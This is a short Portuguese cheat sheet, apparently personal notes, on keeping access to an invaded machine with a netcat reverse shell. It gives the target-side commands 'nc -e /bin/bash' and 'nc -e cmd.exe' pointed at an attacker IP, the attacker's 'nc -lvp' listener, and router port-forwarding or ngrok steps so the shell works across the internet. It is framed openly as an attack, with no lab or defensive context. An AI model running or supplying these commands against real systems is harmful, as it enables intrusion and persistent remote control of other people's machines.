ESSA SHELL REVERSA PODE SER FEITA QUANDO VOCÊ INVADE UMA MÁQUINA E QUEIRA MANTER A CONEXÃO.
	
	ATAQUE LOCAL:
	
		COMANDO NA MÁQUINA ALVO LINUX: nc -e /bin/bash ip_atacante nmr_porta
		
		COMANDO NA MÁQUINA ALVO WINDOWS: nc -e cmd.exe ip_atacante nmr_porta
	
		COMANDO ATACANTE: nc -lvp nmr_porta
	
		O NÚMERO DA PORTA DEVE SER A MESMA NO DOIS LADOS, PARA FAZER A CONEXÃO.
	
		ESSE COMANDO NA MÁQUINA ALVO FAZ COM QUE O ATACANTE CONSIGA SE CONECTAR AO ALVO E EXECUTAR COMANDOS.
	
	ATAQUE EXTERNO:
	
		SE USA O MESMO CÓDIGOS, MAS PRECISA FAZER SEU IP EXTERNO RECEBER
		A CONEXÃO.
				
		1.COLOCAR O IP DO ROTEADOR NO NAVEGADOR E LOGAR.
		
		2. IR EM VIRTUAL SERVICES.
		
		3.ADICIONAR UM VIRTUAL SERVER.
		
		4.COLOCAR O NÚMERO DA PORTA QUE VAI ESCUTAR.
		
		5.COLOCAR O IP DA SUA MÁQUINA.
		
		6.PRONTO AGORA QUANDO UMA MÁQUINA FOR FAZER REVERSE SHELL
		COM SEU IP EXTERNO, IRÁ FUNCIONAR.
		
		EXTRA: TAMBÉM PODE SE USAR O NGROK PARA FAZER O TUNELAMENTE TCP.
